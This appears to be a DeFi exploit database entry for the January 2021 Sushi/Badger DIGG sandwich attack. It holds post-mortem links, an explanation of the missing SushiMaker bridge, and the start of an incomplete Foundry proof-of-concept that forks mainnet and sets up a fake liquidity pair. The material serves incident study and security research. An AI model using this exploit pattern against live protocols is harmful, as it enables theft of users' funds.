# [?] Sushi Badger Digg - Sandwich attack

## Summary
Severity: Unknown
Chain: Ethereum
Component: Sushi_Badger_Digg
Published: 2021-01-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-01/Sushi_Badger_Digg_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
// PoC is incomplete, not sure why but Hardhat and JS gave me a severe headache ¯\_(ツ)_/¯
/*
Attack tx: https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b

Post Mortems: 
https://cmichel.io/replaying-ethereum-hacks-sushiswap-badger-dao-digg/ (author)
https://slowmist.medium.com/slow-mist-sushiswap-was-attacked-for-the-second-time-a47f2d110a84
https://www.rekt.news/badgers-digg-sushi/

When new pairs were added in Sushiswaps’ Onsen, some non-ETH pairs were added, but no "bridge" was set up in the SushiMaker for DIGG/WBTC.

Code:
SushiMaker: https://github.com/sushiswap/sushiswap/blob/64b758156da6f9bde1d8619f142946b005c1ba4a/contracts/SushiMaker.sol#L192
convert burns LP tokens, gets two tokens back, converts one to the other, converts the other to SUSHI, sends SUSHI to SushiBar (XSushi stakers)
deployed: https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50

fee is sent to SushiMaker by SushiSwapPair's burn (from Router::removeLiquidity) in _mintFee
IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract*/

contract Exploit is Test {
    IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3); // DIGG
    ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);

    IUniswapV2Pair private wethPair; // Fake Pair Digg<>WETH

    function testHack() external {
        vm.createSelectFork("mainnet", 11_720_049);

        IUniswapV2Pair FakePair = createAndProvideLiquidity();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-01/Sushi_Badger_Digg_exp.sol_
